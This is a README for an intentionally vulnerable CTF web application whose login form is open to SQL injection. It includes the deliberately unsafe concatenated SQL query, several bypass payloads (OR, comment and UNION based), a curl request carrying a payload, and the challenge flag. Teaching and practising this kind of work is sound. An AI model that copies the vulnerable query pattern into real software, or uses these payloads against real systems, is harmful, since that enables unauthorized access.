# Vulnerable CTF Application - SQL Injection Challenge (React Frontend)

This is an intentionally vulnerable web application designed for Capture The Flag (CTF) challenges. The application features a modern React frontend and contains a deliberate SQL injection vulnerability for educational purposes.

## ⚠️ WARNING ⚠️
This application is INTENTIONALLY VULNERABLE and should NEVER be deployed in a production environment. It is designed for educational purposes and CTF challenges only.

## Challenge Overview
https://medusa-ctf-production.azurewebsites.net/

**Goal:** Login as the `admin` user without knowing the password  
**Flag:** `Medusa{CTF_CHALLENGE_PHASE1_PASSED}` (sent as HTTP response header)  
**Vulnerability:** SQL Injection in the login form  
**Frontend:** Modern React application with Vite build system

## Technology Stack

- **Frontend:** React 19 with Vite
- **Backend:** Node.js with Express
- **Database:** SQLite
- **Deployment:** Azure App Service with Docker
- **CI/CD:** GitHub Actions with Automated Cleanup

## 🤖 Automated Workflows

This project includes several automated GitHub Actions workflows for seamless deployment and resource management:

### 1. **Auto Deploy on Every Commit** (`auto-deploy.yml`)
- ✅ Triggers on every push to any branch
- ✅ Creates unique deployments per commit
- ✅ Automatically cleans up old deployments after each push
- ✅ Keeps only the latest deployment

### 2. **Smart Deploy & Cleanup** (`smart-deploy-cleanup.yml`)
- ✅ Focused on main branch deployments
- ✅ Intelligent cleanup logic
- ✅ Can be run manually for cleanup-only operations
- ✅ Comprehensive deployment summaries

### 3. **Daily Automated Cleanup** (`daily-cleanup.yml`)
- ✅ Runs daily at 3 AM UTC
- ✅ Ensures only the latest deployment remains
- ✅ Prevents resource accumulation
- ✅ Can be triggered manually anytime

### 4. **Azure Deploy** (`azure-deploy.yml`)
- ✅ Handles main branch and PR deployments
- ✅ Includes post-deployment cleanup
- ✅ SQL injection testing
- ✅ Deployment verification

### 5. **Manual Cleanup** (`cleanup-webapps.yml`)
- ✅ On-demand cleanup workflow
- ✅ Works with scheduled runs
- ✅ Detailed cleanup reports

**All workflows automatically:**
- 🧹 Keep only the most recently created Azure web app
- 🗑️ Delete all older deployments
- 🧪 Test the remaining deployment
- 📊 Provide detailed reports in GitHub Actions summaries

## Quick Start

### Option 1: One-Command Restart (Recommended)

```bash
./restart.sh
```

This script will automatically:
1. Stop and cleanup existing containers
2. Rebuild the database
3. Build React frontend and Docker container
4. Run automated tests
5. Show application status

**Script Options:**
```bash
./restart.sh --help        # Show help
./restart.sh --no-tests    # Skip running tests
./restart.sh --cleanup-only # Only cleanup, don't restart
```

### Option 2: Docker Compose

1. Build and start (includes React build):
```bash
docker-compose up --build -d
```

2. Access the application:
```
http://localhost:3000
```

### Option 3: Manual Docker

1. Build the Docker container (includes React build):
```bash
docker build -t vulnerable-ctf-app .
```

2. Run the container:
```bash
docker run -d -p 3000:3000 --name ctf-challenge vulnerable-ctf-app
```

3. Access the application:
```
http://localhost:3000
```

### Option 4: Local Development

1. Install dependencies:
```bash
npm install
```

2. Set up the database:
```bash
npm run setup
```

3. Build React frontend:
```bash
npm run build
```

4. Set the flag environment variable (optional):
```bash
export CTF_FLAG="Medusa{CTF_CHALLENGE_PHASE1_PASSED}"
```

5. Start the server:
```bash
npm start
```

6. Access the application:
```
http://localhost:3000
```

### Development Mode (React + Backend)

For development with hot reloading:

1. Start the backend server:
```bash
npm run dev
```

2. In another terminal, start the React dev server:
```bash
npm run dev-frontend
```

3. Access the React dev server:
```
http://localhost:5173
```

## Restart Script

The `restart.sh` script provides a convenient way to completely restart the CTF application:

```bash
# Full restart with tests
./restart.sh

# Restart without running tests
./restart.sh --no-tests

# Only cleanup existing containers
./restart.sh --cleanup-only

# Show help
./restart.sh --help
```

**What the script does:**
1. 🧹 Stops and removes existing containers/images
2. 🗄️ Rebuilds the SQLite database from scratch
3. 🐳 Builds and starts the Docker container
4. 🧪 Runs automated SQL injection tests
5. 📊 Shows application status and access information

## Environment Configuration

The application uses environment variables for secure flag management:

- `CTF_FLAG`: The flag to display upon successful exploitation (default: "Medusa{CTF_CHALLENGE_PHASE1_PASSED}")
- `PORT`: Server port (default: 3000)
- `NODE_ENV`: Node.js environment (default: development)

## Testing the Vulnerability

### Manual Testing

1. Navigate to `http://localhost:3000`
2. Try to login with normal credentials:
   - Username: `guest`
   - Password: `guest`
   - Expected: "Invalid credentials" (because guest is not admin)

3. Try SQL injection to bypass authentication:
   - Username: `admin' OR '1'='1' --`
   - Password: `anything`
   - Expected: Success message displayed
   - **Flag location**: Check the `X-CTF-Flag` HTTP response header

**Finding the Flag:**
The flag is sent as an HTTP response header named `X-CTF-Flag`. Use browser developer tools (Network tab) or tools like `curl` to inspect the response headers:

```bash
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin\' OR \'1\'=\'1\' --","password":"anything"}' \
  -v
```

### Automated Testing

Run the test script:
```bash
node test-sqli.js
```

## SQL Injection Payloads to Try

Here are some SQL injection payloads you can test:

1. **Basic OR bypass:**
   ```
   Username: admin' OR '1'='1' --
   Password: anything
   ```

2. **Comment-based bypass:**
   ```
   Username: admin'--
   Password: anything
   ```

3. **Union-based (advanced):**
   ```
   Username: admin' UNION SELECT 1,'admin','password' --
   Password: anything
   ```

## Security Features Implemented

Even though the application is vulnerable to SQL injection, it includes several security hardening measures:

1. **Containerization:** Runs in isolated Docker container
2. **Non-root user:** Container runs as non-privileged user
3. **Read-only database:** Database file is set to read-only to prevent DROP TABLE attacks
4. **Header security:** X-Powered-By header is disabled
5. **Principle of least privilege:** Minimal permissions and access

## File Structure

```
vulnerable-ctf-app/
├── frontend/
│   ├── src/
│   │   ├── App.jsx         # Main React component
│   │   ├── main.jsx        # React entry point
│   │   └── index.css       # Styling (Matrix theme)
│   └── index.html          # HTML template
├── dist/                   # Built React files (generated)
├── src/
│   └── index.html          # Legacy HTML (kept for reference)
├── database-setup.js       # Database initialization script
├── server.js              # Express server with vulnerable endpoint
├── package.json           # Node.js dependencies
├── vite.config.js         # Vite build configuration
├── Dockerfile             # Container configuration (includes React build)
├── docker-compose.yml     # Docker Compose configuration
├── restart.sh             # One-command restart script
├── test-sqli.js          # Automated test script
└── README.md             # This file
```

## React Frontend Features

The React frontend includes:
- Modern component-based architecture
- Loading states for better UX
- Enhanced error handling and display
- Responsive design with Matrix-inspired styling
- Proper form validation
- CTF flag display with visual emphasis
- Automatic redirection after successful login

## Available Scripts

```bash
# Backend
npm start                  # Start production server
npm run dev               # Start development server with flag
npm run setup             # Initialize database

# Frontend
npm run build             # Build React app for production
npm run dev-frontend      # Start React dev server
npm run preview           # Preview built React app

# Combined
npm run build-and-start   # Build React + start server
```

## How the Vulnerability Works

The vulnerability exists in the `/login` endpoint in `server.js`:

```javascript
// VULNERABLE CODE - DO NOT USE IN PRODUCTION
const query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";
```

This code directly concatenates user input into the SQL query without sanitization, allowing attackers to inject malicious SQL code.

## Educational Notes

### What Makes This Vulnerable:
- Direct string concatenation in SQL queries
- No input validation or sanitization
- No use of parameterized queries

### How to Fix (DO NOT implement for this challenge):
- Use parameterized queries/prepared statements
- Input validation and sanitization
- Implement proper authentication mechanisms
- Use ORM libraries that prevent SQL injection

## Cleanup

### Quick Cleanup
```bash
./restart.sh --cleanup-only
```

### Manual Cleanup
To stop and remove the Docker container:
```bash
docker-compose down
# or
docker stop ctf-challenge
docker rm ctf-challenge
```

To remove the Docker image:
```bash
docker rmi vulnerable-ctf-app
```

## Legal Disclaimer

This application is provided for educational purposes only. Users are responsible for ensuring this application is used only in authorized testing environments. The creators are not responsible for any misuse of this vulnerable application.
